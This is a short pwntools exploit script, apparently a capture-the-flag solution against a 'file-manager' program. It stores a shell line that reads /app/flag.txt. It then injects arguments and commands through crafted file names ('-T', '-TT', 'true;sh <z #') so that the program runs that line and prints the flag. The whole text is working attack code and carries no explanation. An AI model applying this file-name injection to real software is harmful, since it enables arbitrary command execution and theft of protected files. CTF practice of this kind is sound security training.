...
exe = context.binary = ELF(args.EXE or 'file-manager', checksec=False)
# libc = ELF(elf.libc)
...
sla(b'>', b'5')
sla(b'Input filename: ', b'z')
sla(b'Input data: ', b'IFS= read -r content < "/app/flag.txt"; echo $content')

sla(b'>', b'2')
sla(b'Input filename: ', b'a')
sla(b'Input new filename: ', b'-T')

sla(b'>', b'2')
sla(b'Input filename: ', b'c')
sla(b'Input new filename: ', b'-TT')

sla(b'>', b'2')
sla(b'Input filename: ', b'b')
sla(b'Input new filename: ', b'true;sh <z #')

sla(b'>', b'7')
sla(b'Input filename: ', b'flag')

sl(b'0')

success(io.stream().decode())
